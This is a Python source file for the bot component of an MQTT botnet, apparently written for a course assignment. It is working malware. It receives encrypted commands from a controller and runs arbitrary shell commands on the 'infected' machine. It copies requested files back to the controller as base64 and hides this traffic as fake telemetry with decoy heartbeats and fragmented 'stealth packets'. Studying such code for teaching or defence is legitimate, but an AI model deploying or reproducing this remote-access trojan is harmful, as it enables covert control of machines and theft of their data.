# 5. Minimal required functionality of the bots:
#   1. announcing the presence of the bot to the controller if asked.
#   2. listing users currently logged in the "infected" device (output of 'w' command).
#   3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
#   4. id of the user running the bot (output of 'id command').
#   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
#   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
import base64
import json
import subprocess
import time
import threading

import paho.mqtt.client as mqtt
from consts import *
import random

from utils import encrypt_payload_AES_then_b64, decrypt_payload, log

DEBUG_PRINT = False
# broker = central server that receives all messages
#          and then routes them to the correct destinations.

def run_heartbeat(client):
    """ Sends periodic heartbeat messages to pretend to send normal periodic telemetry data.
    Has no use otherwise."""
    while True:
        # random delay (45-90s)
        time.sleep(random.uniform(45, 90))
        heartbeat_text = f"HEARTBEAT: {BOT_ID} status OK"

        # Send as 1/1 chunk
        formatted_heartbeat = f"CHK:001:001:{heartbeat_text}"
        encrypted_heartbeat = encrypt_payload_AES_then_b64(formatted_heartbeat)

        packet = {
            "s_id": BOT_ID,
            "type": "telemetry_data",
            "v_line": round(random.uniform(229.0, 231.5), 1),
            DATA_KEY: encrypted_heartbeat
        }
        if(DEBUG_PRINT):
            log("[*] fake heartbeat message sent...")
        with mqtt_lock:
            client.publish(TOPIC, json.dumps(packet))


def send_fragmented_response(client, raw_result):
    """Breaks large results into 512-byte stealth packets"""
    #  leave room for prefix 'CHK:00:00:' (approx 12 chars)
    # 512 (target) - 4 (len prefix) - 12 (chunk metadata) = ~490
    #  use slightly smaller to be safe
    chunk_size = 480

    # Split the big string into pieces
    chunks = [raw_result[i:i + chunk_size] for i in range(0, len(raw_result), chunk_size)]
    total = len(chunks)

    for i, chunk_data in enumerate(chunks):
        # 3 digits for chunk indices to support very large files
        # Format:
        #       CHK:[current_index]:[total_count]:[data]
        fragment_text = f"CHK:{i+1:03d}:{total:03d}:{chunk_data}"

        encrypted_chunk = encrypt_payload_AES_then_b64(fragment_text)

        packet = {
            "s_id": BOT_ID,
            "type": "telemetry_data",
            DATA_KEY: encrypted_chunk
        }
        with mqtt_lock:
            client.publish(TOPIC, json.dumps(packet))
        log(f" - Sent chunk {i+1}/{total} ({len(chunk_data)} bytes)")

        # random delay
        # NOTE, for a realistic bot, this should be a lot longer - similar to the heartbeat probably,
        #  but for building and grading, nobody wants to wait longer
        time.sleep(random.uniform(3, 5))


def on_message(client, userdata, msg):
    """ Callback when a message is received """
    try:
        # try parse json
        packet = json.loads(msg.payload.decode())
        # Check for secret ID
        if packet.get("s_id") == CONTROLLER_ID:
            encrypted_data = packet.get(DATA_KEY)
            payload_data = decrypt_payload(encrypted_data)
            parts = payload_data.split(" ", 1)
            action = parts[0]  # e.g., "ls"
            if(DEBUG_PRINT):
                log(f"[*] Received command: {action}")
            argument = parts[1] if len(parts) > 1 else ""

            # introduce random delay
            time.sleep(random.uniform(0.35, 1.69))

            t = threading.Thread(target=process_and_respond, args=(client, action, argument))
            t.start()

    except:
        # ignore other messages
        pass

def process_and_respond(client, action, argument):
    """ Process command and send response in chunks """
    result = get_action_result(action, argument)
    log(f"[*] Dispatching response ({len(result)} bytes) in chunks...")
    send_fragmented_response(client, result)



def get_action_result(action, argument):
    """ Process the command and return the result string """
    try:
        if action == CMD_ANNOUNCE_BOT:
            result = f"Bot {BOT_ID} is online."
        elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
            with open(argument, "rb") as f:
                encoded_str = base64.b64encode(f.read()).decode('utf-8')
                result = f"FILE_B64:{argument}:{encoded_str}"
        else:
            # execute other commands directly
            # ignore blank "" args
            try:
                full_cmd = f"{action} {argument}".strip()
                result = subprocess.check_output(full_cmd, shell=True, stderr=subprocess.STDOUT).decode()
                # Return result if exists, otherwise return the success string
                return result if result.strip() else f"Execution of '{full_cmd}' successful (no output)."
            except subprocess.CalledProcessError as e:
                # Return the actual error from the shell
                return f"Command Error (Exit Code {e.returncode}): {e.output.decode().strip()}"

        if result == "":
            result = f"Command {action} executed successfully."
        return result

    except Exception as e:
        return f"System Error executing {action}: {str(e)}"

if __name__ == '__main__':
    # both the bot and the controller are 'clients'
    # added version to avoid warning
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    mqtt_lock = threading.Lock()

    threading.Thread(target=run_heartbeat, args=(client,), daemon=True).start()
    # callback when a message is received
    client.on_message = on_message
    client.connect(BROKER, PORT)
    client.subscribe(TOPIC)

    log("Subscribed! Waiting for commands...")

    # prevents the script from ending.
    client.loop_forever()
